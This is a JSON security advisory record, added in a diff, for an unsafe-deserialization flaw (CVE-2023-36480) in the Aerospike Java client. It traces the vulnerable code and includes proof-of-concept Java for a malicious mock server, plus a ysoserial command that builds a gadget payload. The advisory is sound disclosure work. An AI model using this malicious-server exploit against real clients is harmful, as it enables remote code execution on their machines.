@@ -1,0 +1,147 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-jj95-55cr-9597",
+  "modified": "2023-08-08T22:15:13Z",
+  "published": "2023-08-03T19:45:39Z",
+  "aliases": [
+    "CVE-2023-36480"
+  ],
+  "summary": "Aerospike Java Client vulnerable to unsafe deserialization of server responses",
+  "details": "# GitHub Security Lab (GHSL) Vulnerability Report: `GHSL-2023-044`\n\nThe [GitHub Security Lab](https://securitylab.github.com) team has identified a potential security vulnerability in [Aerospike Java Client](https://github.com/aerospike/aerospike-client-java/).\n\nWe are committed to working with you to help resolve this issue. In this report you will find everything you need to effectively coordinate a resolution of this issue with the GHSL team.\n\nIf at any point you have concerns or questions about this process, please do not hesitate to reach out to us at `securitylab@github.com` (please include `GHSL-2023-044` as a reference).\n\nIf you are _NOT_ the correct point of contact for this report, please let us know!\n\n## Summary\n\nThe Aerospike Java client is a Java application that implements a network protocol to communicate with an Aerospike server. Some of the messages received from the server contain Java objects that the client deserializes when it encounters them without further validation. Attackers that manage to trick clients into communicating with a malicious server can include especially crafted objects in its responses that, once deserialized by the client, force it to execute arbitrary code. This can be abused to take control of the machine the client is running on.\n\n## Product\n\nAerospike Java Client\n\n## Tested Version\n\n[6.1.7](https://github.com/aerospike/aerospike-client-java/releases/tag/6.1.7)\n\n## Details\n\n### Issue: Unsafe deserialization of server responses (`GHSL-2023-044`)\n\nThe Aerospike Java client implements different ways of communicating with an Aerospike server to perform several operations. Asynchronous commands can be executed using the Netty framework using the `NettyCommand` class. This class includes an `InboundHandler` that extends Netty's `ChannelInboundHandlerAdapter`, which handles inbound data coming from the Netty channel established with the server. This is implemented in the `channelRead` method:\n\n[`client/src/com/aerospike/client/async/NettyCommand.java:1157`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157)\n\n```java\n@Override\npublic void channelRead(ChannelHandlerContext ctx, Object msg) {\n    command.read((ByteBuf)msg);\n}\n```\n\nThe incoming `msg` object is handled by the `NettyCommand.read` method, which behaves differently depending on the `state` variable. Several states produce paths to the vulnerable code — for instance, we will follow the path through `AsyncCommand.COMMAND_READ_HEADER`:\n\n[`/client/src/com/aerospike/client/async/NettyCommand.java:489`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489)\n\n```java\nprivate void read(ByteBuf byteBuffer) {\n    eventReceived = true;\n\n    try {\n        switch (state) {\n            // --snip--\n            case AsyncCommand.COMMAND_READ_HEADER:\n                if (command.isSingle) {\n                    readSingleHeader(byteBuffer);\n                }\n                // --snip--\n        }\n        // --snip--\n    }\n    // --snip---\n}\n```\n\nSome bytes are read from the message buffer and saved in `command.dataBuffer` in the `readSingleHeader` method, after which `parseSingleBody` is called:\n\n[`client/src/com/aerospike/client/async/NettyCommand.java:596`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596)\n\n```java\nprivate void readSingleHeader(ByteBuf byteBuffer) {\n    int readableBytes = byteBuffer.readableBytes();\n    int dataSize = command.dataOffset + readableBytes;\n\n    // --snip--\n\n    byteBuffer.readBytes(command.dataBuffer, 0, dataSize);\n    command.dataOffset = dataSize;\n\n    if (command.dataOffset >= receiveSize) {\n        parseSingleBody();\n    }\n}\n```\n\n`parseSingleBody` simply delegates on `AsyncCommand.parseCommandResult`, which unless the message is compressed, directly calls `AsyncCommand.parseResult`. The implementation of this method depends on the command type. For an `AsyncRead` command, we have the following:\n\n[`client/src/com/aerospike/client/async/AsyncRead.java:68`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68)\n\n```java\n@Override\nprotected final boolean parseResult() {\n    validateHeaderSize();\n\n    int resultCode = dataBuffer[dataOffset + 5] & 0xFF;\n    int generation = Buffer.bytesToInt(dataBuffer, dataOffset + 6);\n    int expiration = Buffer.bytesToInt(dataBuffer, dataOffset + 10);\n    int fieldCount = Buffer.bytesToShort(dataBuffer, dataOffset + 18);\n    int opCount = Buffer.bytesToShort(dataBuffer, dataOffset + 20);\n    dataOffset += Command.MSG_REMAINING_HEADER_SIZE;\n\n    if (resultCode == 0) {\n        // --snip--\n        skipKey(fieldCount);\n        record = parseRecord(opCount, generation, expiration, isOperation);\n        return true;\n    }\n```\n\nIt can be seen that several fields are read from the message's bytes, and then a call to `Command.parseRecord` happens:\n\n[`client/src/com/aerospike/client/command/Command.java:2083`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083)\n\n```java\nprotected final Record parseRecord(\n    int opCount,\n    int generation,\n    int expiration,\n    boolean isOperation\n)  {\n    Map<String,Object> bins = new LinkedHashMap<>();\n\n    for (int i = 0 ; i < opCount; i++) {\n        int opSize = Buffer.bytesToInt(dataBuffer, dataOffset);\n        byte particleType = dataBuffer[dataOffset + 5];\n        byte nameSize = dataBuffer[dataOffset + 7];\n        String name = Buffer.utf8ToString(dataBuffer, dataOffset + 8, nameSize);\n        dataOffset += 4 + 4 + nameSize;\n\n        int particleBytesSize = opSize - (4 + nameSize);\n        Object value = Buffer.bytesToParticle(particleType, dataBuffer, dataOffset, particleBytesSize);\n```\n\n`Buffer.bytesToParticle` converts the remaining bytes in the data buffer depending on the `particleType` field. We're interested in the `JBLOB` case:\n\n[`client/src/com/aerospike/client/command/Buffer.java:53`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53)\n\n```java\npublic static Object bytesToParticle(int type, byte[] buf, int offset, int len)\n    throws AerospikeException {\n        switch (type) {\n            // --snip--\n            case ParticleType.JBLOB:\n                return Buffer.bytesToObject(buf, offset, len);\n```\n\nIn `bytesToObject`, the deserialization of an object from the message bytes happens:\n\n[`client/src/com/aerospike/client/command/Buffer.java:300`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L300)\n\n```java\npublic static Object bytesToObject(byte[] buf, int offset, int length) {\n    // --snip--\n    try (ByteArrayInputStream bastream = new ByteArrayInputStream(buf, offset, length)) {\n        try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {\n            return oistream.readObject();\n        }\n    }\n    // --snip--\n}\n```\n\nNOTE: Take into account that there exists a similar sink, that can be reached in a similar way, in `Unpacker.unpackBlock`:\n\n[`client/src/com/aerospike/client/util/Unpacker.java:227`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227)\n\n```java\nprivate T unpackBlob(int count) throws IOException, ClassNotFoundException {\n    // --snip--\n    case ParticleType.JBLOB:\n        // --snip--\n        try (ByteArrayInputStream bastream = new ByteArrayInputStream(buffer, offset, count)) {\n            try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {\n                val = getJavaBlob(oistream.readObject());\n            }\n        }\n```\n\nThis vulnerability was discovered with the help of [CodeQL](https://codeql.github.com/).\n\n#### Impact\n\nThis issue may lead to Remote Code Execution (RCE) in the Java client.\n\n#### Remediation\n\nAvoid deserialization of untrusted data if at all possible. If the architecture permits it then use other formats instead of serialized objects, for example JSON or XML.  However, these formats should not be deserialized into complex objects because this provides further opportunities for attack. For example, XML-based deserialization attacks are possible through libraries such as XStream and XmlDecoder.\n\nAlternatively, a tightly controlled whitelist can limit the vulnerability of code but be aware of the existence of so-called Bypass Gadgets, which can circumvent such protection measures.\n\n#### Resources\n\nTo exploit this vulnerability, a malicious Aerospike server is needed. For the sake of simplicity, we implemented a mock server with hardcoded responses, with the only goal of reaching the vulnerable code of the client. To be able to easily reproduce this, we used the client's examples with the `-netty` flag, specifically the `AsyncPutGet`, which uses an `AsyncRead`. The examples point to `localhost:3000` by default, so we set up a simple Netty TCP server listening on that port, which replicates responses previously intercepted from a real Aerospike server and returns them to the client, until the `AsyncRead` command happens. Then, our server injects the malicious response:\n\n```java\npublic class AttackChannelHandler extends SimpleChannelInboundHandler<String> {\n\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, String s) throws Exception {\n        // --snip--\n        if (s.getBytes()[7] == 0x44) {\n            AttackMessage m = new AttackMessage(\n                    Files.readAllBytes(Paths.get(\"location/of/deserialization/payload.bin\")));\n            ctx.channel().writeAndFlush(m);\n            return;\n        }\n        // --snip--\n    }\n}\n```\n\n`AttackMessage` is a class that hardcodes the necessary data to deliver the payload:\n\n```java\npublic class AttackMessage {\n\n    private byte resultCode = 0;\n    private int generation = 2;\n    private int expiration = 417523457;\n    private short fieldCount = 0;\n    private short opCount = 1;\n    private byte particleType = 7;\n    private String name = \"putgetbin\";\n    private byte[] payload;\n\n    public AttackMessage(byte[] payload) {\n        this.payload = payload;\n    }\n\n    // --snip-- (getters)\n\n    public int[] getSize() {\n        int size = 30 + name.length() + payload.length;\n        int low = (byte) (size & 0xFF);\n        int high = (byte) (size >> 8) & 0xFF;\n        return new int[] {high, low};\n    }\n\n    public int getOpSize() {\n        return payload.length + 4 + name.length();\n    }\n\n    public byte[] getPayload() {\n        return payload;\n    }\n}\n```\n\nAnd it's finally encoded and delivered to the client through the network using a `MessageToByteEncoder` from Netty:\n\n```java\npublic class AttackMessageEncoder extends MessageToByteEncoder<AttackMessage> {\n\n    @Override\n    protected void encode(ChannelHandlerContext ctx, AttackMessage msg, ByteBuf out)\n            throws Exception {\n        // header\n        out.writeBytes(new byte[] {0x02, 0x03, 0x00, 0x00, 0x00, 0x00});\n        int[] length = msg.getSize();\n        out.writeByte(length[0]);\n        out.writeByte(length[1]);\n\n        out.writeBytes(new byte[] {0x16, 0x00, 0x00, 0x00, 0x00});\n        out.writeByte(msg.getResultCode());\n        out.writeInt(msg.getGeneration());\n        out.writeInt(msg.getExpiration());\n\n        out.writeBytes(new byte[] {0x00, 0x00, 0x00, 0x00});\n        out.writeShort(msg.getFieldCount());\n        out.writeShort(msg.getOpCount());\n        out.writeInt(msg.getOpSize());\n\n        out.writeByte(0x01);\n        out.writeByte(msg.getParticleType());\n\n        out.writeByte(0x00);\n        out.writeByte(msg.getName().length());\n        out.writeCharSequence(msg.getName(), Charset.defaultCharset());\n        out.writeBytes(msg.getPayload());\n    }\n\n}\n```\n\nThe specific deserialization payload that needs to be used depends on the deserialization gadgets available in the classpath of the application using the Aerospike client. Again, for simplicity, we assumed the victim application uses Apache Commons Collections 4.0, which contains a well-known deserialization gadget:\n\n```xml\n<dependency>\n  <groupId>org.apache.commons</groupId>\n  <artifactId>commons-collections4</artifactId>\n  <version>4.0</version>\n</dependency>\n```\n\nIn which case, the malicious payload file could be generated using [`ysoserial`](https://github.com/frohoff/ysoserial) as follows:\n\n```\njava -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 '/System/Applications/Calculator.app/Contents/MacOS/Calculator' > payload.bin\n```\n\n## GitHub Security Advisories\n\nWe recommend you create a private [GitHub Security Advisory](https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory) for this finding. This also allows you to invite the GHSL team to collaborate and further discuss this finding in private before it is [published](https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory).\n\n## Credit\n\nThis issue was discovered and reported by the GitHub CodeQL team members [@atorralba (Tony Torralba)](https://github.com/atorralba) and [@joefarebrother (Joseph Farebrother)](https://github.com/joefarebrother).\n\n## Contact\n\nYou can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2023-044` in any communication regarding this issue.\n\n## Disclosure Policy\n\nThis report is subject to our [coordinated disclosure policy](https://securitylab.github.com/advisories#policy).",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Maven",
+        "name": "com.aerospike:aerospike-client"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "6.0.0"
+            },
+            {
+              "fixed": "6.2.0"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "Maven",
+        "name": "com.aerospike:aerospike-client"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "5.0.0"
+            },
+            {
+              "fixed": "5.2.0"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "Maven",
+        "name": "com.aerospike:aerospike-client"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.5.0"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/aerospike/aerospike-client-java/security/advisories/GHSA-jj95-55cr-9597"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-36480"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/aerospike/aerospike-client-java/commit/02bf28e62fb186f004c82c87b219db2fc5b8262a"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/aerospike/aerospike-client-java/commit/51c65e32837da29435161a2d9c09bbdc2071ecae"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/aerospike/aerospike-client-java/commit/66aafb4cd743cf53baffaeaf69b035f51d2e2e36"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/aerospike/aerospike-client-java/commit/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/aerospike/aerospike-client-java"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227"
+    },
+    {
+      "type": "WEB",
+      "url": "https://support.aerospike.com/s/article/CVE-2023-36480-Aerospike-Java-Client-vulnerable-to-unsafe-deserialization-of-server-responses"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-502"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-08-03T19:45:39Z",
+    "nvd_published_at": "2023-08-04T15:15:10Z"
+  }
+}
